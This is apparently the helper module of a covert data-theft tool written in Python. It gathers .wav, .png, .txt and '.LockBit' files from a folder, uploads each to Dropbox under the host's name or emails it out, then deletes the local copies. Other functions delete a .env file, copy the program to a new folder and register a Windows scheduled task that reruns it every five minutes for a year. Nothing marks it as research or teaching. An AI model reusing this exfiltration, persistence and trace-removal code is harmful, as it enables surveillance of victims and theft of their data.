import dropbox
import os
import psutil
import shutil
import smtplib
import subprocess

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


def send_mail_with_attachment(
    smtp_server,
    smtp_port,
    email_address,
    email_password,
    email_sender,
    email_receiver,
    cc="",
    path_to_attachment="",
    attachments=[],
    subject="",
    body="",
):
    message = MIMEMultipart()
    message["From"] = email_sender
    message["To"] = email_receiver
    message["Cc"] = cc
    message["Subject"] = subject

    message.attach(MIMEText(body, "plain"))

    for attachment in attachments:
        file_path = os.path.join(path_to_attachment, attachment)
        try:
            with open(file_path, "rb") as attach_file:
                payload = MIMEBase("application", "octet-stream")
                payload.set_payload(attach_file.read())
            encoders.encode_base64(payload)
            payload.add_header("Content-Disposition", f"attachment; filename={attachment}")
            message.attach(payload)
        except Exception as e:
            print(f"[send_mail] WARNING - Could not attach '{attachment}': {e}")

    try:
        session = smtplib.SMTP(smtp_server, smtp_port)
        # session.starttls()  # Enable security
        session.login(email_address, email_password)
        text = message.as_string()
        session.sendmail(email_sender, email_receiver, text)
        session.quit()
    except Exception as e:
        print(f"[send_mail] ERROR - Could not send email: {e}")
        return False
    return True


def get_wav_and_png_files(dest_folder):
    wav_and_png_files = []
    if os.path.exists(dest_folder) and os.path.isdir(dest_folder):
        for filename in os.listdir(dest_folder):
            if (
                filename.endswith(".wav")
                or filename.endswith(".png")
                or filename.endswith(".txt")
                or filename.endswith(".LockBit")
            ):
                wav_and_png_files.append(filename)

    return wav_and_png_files


def delete_wav_and_png_files(dest_folder):
    if os.path.exists(dest_folder) and os.path.isdir(dest_folder):
        for filename in os.listdir(dest_folder):
            if (
                filename.endswith(".wav")
                or filename.endswith(".png")
                or filename.endswith(".txt")
                or filename.endswith(".LockBit")
            ):
                file_path = os.path.join(dest_folder, filename)
                try:
                    os.remove(file_path)
                except Exception as e:
                    print(f"[delete_files] WARNING - Could not delete '{filename}': {e}")


def remove_env_file():
    if os.name == "nt":  # Windows
        env_file = os.path.join(os.getcwd(), ".env")
        if os.path.exists(env_file):
            os.remove(env_file)
    else:  # Linux or Unix
        env_file = os.path.join(os.getcwd(), ".env")
        if os.path.exists(env_file):
            os.remove(env_file)


def upload_to_dropbox(hostname, dbx, wav_and_png_files, dest_folder):
    for file_name in wav_and_png_files:
        file_path = os.path.join(dest_folder, file_name)
        destination_path = f"/{hostname}_{file_name}"
        try:
            with open(file_path, "rb") as f:
                dbx.files_upload(f.read(), destination_path)
            print(f"[upload_to_dropbox] Uploaded: {file_name}")
        except FileNotFoundError as e:
            print(f"[upload_to_dropbox] WARNING - File not found '{file_name}': {e}")
        except dropbox.exceptions.ApiError as e:
            print(f"[upload_to_dropbox] WARNING - Dropbox API error for '{file_name}': {e}")
        except Exception as e:
            print(f"[upload_to_dropbox] WARNING - Could not upload '{file_name}': {e}")


def create_scheduled_task(executable_path, task_name):
    try:
        check_task_command = f'if (Get-ScheduledTask -TaskName "{task_name}" -ErrorAction SilentlyContinue) {{ exit 1 }} else {{ exit 0 }}'
        task_exists = subprocess.run(
            ["powershell", "-Command", check_task_command],
            capture_output=True,
            text=True,
            timeout=15,
        )
        if task_exists.returncode == 1:
            print(f"[create_scheduled_task] Task '{task_name}' already exists, skipping.")
            return True
    except subprocess.TimeoutExpired:
        print(f"[create_scheduled_task] WARNING - Timed out checking for task '{task_name}'.")
        return False
    except Exception as e:
        print(f"[create_scheduled_task] WARNING - Could not check task existence: {e}")
        return False

    try:
        create_task_command = f"""
        $action = New-ScheduledTaskAction -Execute '{executable_path}'
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 365)
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "{task_name}" -Description "Esegue il processo custom ogni 5 minuti"
        """
        subprocess.run(
            ["powershell", "-Command", create_task_command],
            check=True,
            capture_output=True,
            text=True,
            timeout=30,
        )
        print(f"[create_scheduled_task] Task '{task_name}' created successfully.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[create_scheduled_task] WARNING - PowerShell error creating task: {e.stderr}")
        return False
    except subprocess.TimeoutExpired:
        print(f"[create_scheduled_task] WARNING - Timed out creating task '{task_name}'.")
        return False
    except Exception as e:
        print(f"[create_scheduled_task] WARNING - Could not create scheduled task: {e}")
        return False


def save_program_in_location(src_file, dest_folder):
    try:
        os.makedirs(dest_folder, exist_ok=True)
    except Exception as e:
        print(f"[save_program] WARNING - Could not create destination folder '{dest_folder}': {e}")

    dest_file = os.path.join(dest_folder, os.path.basename(src_file))

    try:
        if not os.path.exists(dest_file):
            shutil.copy(src_file, dest_file)
            print(f"[save_program] Copied '{src_file}' to '{dest_file}'.")
        else:
            print(f"[save_program] File already exists at '{dest_file}', skipping copy.")
    except Exception as e:
        print(f"[save_program] WARNING - Could not copy '{src_file}' to '{dest_file}': {e}")

    return dest_file


def is_process_running(process_name):
    count = 0
    for proc in psutil.process_iter(attrs=["pid", "name"]):
        if proc.info["name"] == process_name:
            count += 1
    return count



